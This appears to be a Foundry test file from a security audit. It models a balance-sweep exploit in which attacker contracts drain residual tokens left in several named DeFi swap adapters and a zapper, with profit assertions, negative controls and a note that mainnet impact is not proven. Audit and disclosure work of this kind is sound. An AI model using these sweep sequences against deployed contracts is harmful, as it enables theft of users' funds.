// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {HypertradeAdapter} from "../contracts/periphery/HypertradeAdapter.sol";
import {GluexAdapter} from "../contracts/periphery/GluexAdapter.sol";
import {LiquidSwapAdapter} from "../contracts/periphery/LiquidSwapAdapter.sol";
import {wHlpZapper} from "../contracts/periphery/wHlpZapper.sol";
import {
    MockERC20,
    MockNoOpRouter,
    MockLiquidRouter,
    MockDepositor,
    MockWHYPE,
    MockRefundRouter,
    AdapterAttacker,
    ZapperAttacker
} from "./Mocks.sol";

/// @notice LOCAL MODEL, NOT A MAINNET FORK. External fixed routers and the
/// hard-coded USDT0/depositor are etched with mocks; all victim funding,
/// approvals, route setting, sweeps, and redemptions are real local EVM calls.
/// These tests prove the code-level balance-confusion mechanism only. They do
/// not prove a mainnet residual balance or zero-input router behavior.
contract AdapterBalanceDrainTest is Test {
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address internal constant DEPOSITOR = 0x340C9f6159ABc2bdfCC0E2b9Fe91D739006b41c1;

    address internal attacker = address(0xA77ACC);
    address internal victim = address(0xB1C71);
    uint256 internal constant B = 1_000_000;

    MockERC20 internal tokenIn;
    MockERC20 internal tokenOut;
    AdapterAttacker internal adapterAttacker;

    function setUp() public {
        tokenIn = new MockERC20("debt", "D", 18);
        tokenOut = new MockERC20("yield", "Y", 18);
        adapterAttacker = new AdapterAttacker();
    }

    function test_Model_HypertradeZeroInputSweep_AssertProfit() public {
        MockNoOpRouter router = new MockNoOpRouter();
        HypertradeAdapter adapter = new HypertradeAdapter(address(router));
        _seedResidual(tokenOut, address(adapter), B);

        uint256 attackerBefore = tokenOut.balanceOf(attacker);
        uint256 protocolBefore = tokenOut.balanceOf(address(adapter));
        uint256 gasBefore = gasleft();
        vm.prank(attacker);
        adapterAttacker.sweepHypertrade(adapter, address(tokenIn), address(tokenOut), attacker);
        uint256 gasUsed = gasBefore - gasleft();

        _assertDrain(tokenOut, address(adapter), attackerBefore, protocolBefore, B, gasUsed, "Hypertrade");
    }

    function test_Model_GluexZeroInputSweep_AssertProfit() public {
        GluexAdapter adapter = new GluexAdapter();
        MockNoOpRouter router = new MockNoOpRouter();
        // test-only-state-override: fixed external GlueX router replaced by no-op model.
        vm.etch(adapter.gluex(), address(router).code);
        _seedResidual(tokenOut, address(adapter), B);

        uint256 attackerBefore = tokenOut.balanceOf(attacker);
        uint256 protocolBefore = tokenOut.balanceOf(address(adapter));
        uint256 gasBefore = gasleft();
        vm.prank(attacker);
        adapterAttacker.sweepGluex(adapter, address(tokenIn), address(tokenOut), attacker);
        uint256 gasUsed = gasBefore - gasleft();

        _assertDrain(tokenOut, address(adapter), attackerBefore, protocolBefore, B, gasUsed, "Gluex");
    }

    function test_Model_LiquidZeroInputSweep_AssertProfit() public {
        LiquidSwapAdapter adapter = new LiquidSwapAdapter();
        MockLiquidRouter router = new MockLiquidRouter();
        // test-only-state-override: fixed external LiquidSwap router replaced by no-op model.
        vm.etch(address(adapter.liquidSwapRouter()), address(router).code);
        _seedResidual(tokenOut, address(adapter), B);

        uint256 attackerBefore = tokenOut.balanceOf(attacker);
        uint256 protocolBefore = tokenOut.balanceOf(address(adapter));
        uint256 gasBefore = gasleft();
        vm.prank(attacker);
        adapterAttacker.sweepLiquid(adapter, address(tokenIn), address(tokenOut), attacker);
        uint256 gasUsed = gasBefore - gasleft();

        _assertDrain(tokenOut, address(adapter), attackerBefore, protocolBefore, B, gasUsed, "LiquidSwap");
    }

    function test_Model_ZapperZeroInputSweep_AssertProfit() public {
        MockLiquidRouter liquid = new MockLiquidRouter();
        MockNoOpRouter hyper = new MockNoOpRouter();
        MockDepositor depositorCode = new MockDepositor();
        MockERC20 usdt0Code = new MockERC20("USDT0", "USDT0", 18);
        // test-only-state-overrides for hard-coded external integration addresses.
        vm.etch(USDT0, address(usdt0Code).code);
        vm.etch(DEPOSITOR, address(depositorCode).code);

        wHlpZapper zapper = new wHlpZapper(address(liquid), address(hyper));
        MockERC20 usdt0 = MockERC20(USDT0);
        _seedResidual(usdt0, address(zapper), B);
        ZapperAttacker sweepContract = new ZapperAttacker();

        uint256 attackerBefore = usdt0.balanceOf(attacker);
        uint256 protocolBefore = usdt0.balanceOf(address(zapper));
        uint256 gasBefore = gasleft();
        vm.prank(attacker);
        sweepContract.sweepLiquid(zapper, MockDepositor(DEPOSITOR), USDT0, address(tokenIn), attacker);
        uint256 gasUsed = gasBefore - gasleft();

        _assertDrain(usdt0, address(zapper), attackerBefore, protocolBefore, B, gasUsed, "wHlpZapper.zapIn");
    }

    function test_Model_HypertradeZapperDonationNotCredited() public {
        MockLiquidRouter liquid = new MockLiquidRouter();
        MockNoOpRouter hyper = new MockNoOpRouter();
        MockDepositor depositorCode = new MockDepositor();
        MockERC20 usdt0Code = new MockERC20("USDT0", "USDT0", 18);
        vm.etch(USDT0, address(usdt0Code).code);
        vm.etch(DEPOSITOR, address(depositorCode).code);
        wHlpZapper zapper = new wHlpZapper(address(liquid), address(hyper));
        MockERC20 usdt0 = MockERC20(USDT0);
        _seedResidual(usdt0, address(zapper), B);

        vm.prank(attacker);
        zapper.zapInHypertrade(address(tokenIn), 0, hex"00", 0, 0, block.timestamp + 1);

        assertEq(usdt0.balanceOf(address(zapper)), B, "delta-based zap keeps residual");
        assertEq(MockDepositor(DEPOSITOR).shareToken().balanceOf(attacker), 0, "no shares from residual");
        console2.log("negative_control=wHlpZapper.zapInHypertrade attacker_shares=0 residual_unchanged=", B);
    }

    function test_Model_NativeRouterRefundBecomesSweepableWhypeResidual() public {
        address WHYPE = 0x5555555555555555555555555555555555555555;
        MockRefundRouter router = new MockRefundRouter();
        MockWHYPE whypeCode = new MockWHYPE();
        vm.etch(WHYPE, address(whypeCode).code);
        HypertradeAdapter adapter = new HypertradeAdapter(address(router));

        vm.deal(victim, 2 ether);
        vm.prank(victim);
        (bool funded,) = address(router).call{value: 2 ether}("");
        assertTrue(funded);

        // A router-native refund is wrapped even though the requested tokenOut
        // is not WHYPE, leaving 1e18 WHYPE units in the adapter.
        vm.prank(victim);
        adapterAttacker.hypertradeWithData(
            adapter, address(tokenIn), address(tokenOut), hex"01", victim
        );
        assertEq(MockERC20(WHYPE).balanceOf(address(adapter)), 1 ether);

        uint256 attackerBefore = MockERC20(WHYPE).balanceOf(attacker);
        vm.prank(attacker);
        adapterAttacker.sweepHypertrade(adapter, address(tokenIn), WHYPE, attacker);
        uint256 delta = MockERC20(WHYPE).balanceOf(attacker) - attackerBefore;

        assertEq(delta, 1 ether);
        assertEq(MockERC20(WHYPE).balanceOf(address(adapter)), 0);
        assertGt(delta, 0);
        console2.log("native_refund_residual_delta_attacker_WHYPE_units", delta);
        console2.log("native_refund_residual_delta_protocol_WHYPE_units", -int256(delta));
        console2.log("native_refund_residual_PnL_attacker_WHYPE_units", delta);
        console2.log("mainnet_fork_proven", false);
    }

    function test_Model_SelfDonationHasZeroPnL_NotAFinding() public {
        MockNoOpRouter router = new MockNoOpRouter();
        HypertradeAdapter adapter = new HypertradeAdapter(address(router));
        tokenOut.mint(attacker, B);
        vm.prank(attacker);
        tokenOut.transfer(address(adapter), B);

        vm.prank(attacker);
        adapterAttacker.sweepHypertrade(adapter, address(tokenIn), address(tokenOut), attacker);

        assertEq(tokenOut.balanceOf(attacker), B, "only attacker's own donation returned");
        console2.log("rejected_self_donation: delta_attacker_net=0 token units; gas makes realized PnL negative");
    }

    function _seedResidual(MockERC20 token, address target, uint256 amount) internal {
        token.mint(victim, amount);
        vm.prank(victim);
        token.transfer(target, amount);
    }

    function _assertDrain(
        MockERC20 token,
        address target,
        uint256 attackerBefore,
        uint256 protocolBefore,
        uint256 expected,
        uint256 gasUsed,
        string memory label
    ) internal {
        uint256 attackerAfter = token.balanceOf(attacker);
        uint256 protocolAfter = token.balanceOf(target);
        int256 deltaAttacker = int256(attackerAfter) - int256(attackerBefore);
        int256 deltaProtocol = int256(protocolAfter) - int256(protocolBefore);
        int256 deltaVictim = -int256(expected); // residual seed → sweep, whole sequence
        int256 pnl = deltaAttacker; // input=flashFee=slippage=collateral=gasTokenCost=0 in model

        assertEq(attackerAfter - attackerBefore, expected, "attacker receives residual");
        assertEq(protocolAfter, 0, "adapter/zapper residual drained");
        assertEq(deltaProtocol, -int256(expected), "protocol residual decreases");
        assertEq(deltaAttacker + deltaProtocol, 0, "sweep conserves residual tokens");
        assertGt(pnl, 0, "sweep must assert positive profit");
        assertEq(token.balanceOf(victim), 0, "victim funded residual");

        console2.log("block", block.number);
        console2.log(label);
        console2.log("delta_attacker_token_units", deltaAttacker);
        console2.log("delta_protocol_token_units", deltaProtocol);
        console2.log("delta_victim_LP_token_units", deltaVictim);
        console2.log("PnL_attacker_token_units", pnl);
        console2.log("gas_used_native_fee_not_converted", gasUsed);
        console2.log("mainnet_fork_proven", false);
    }
}
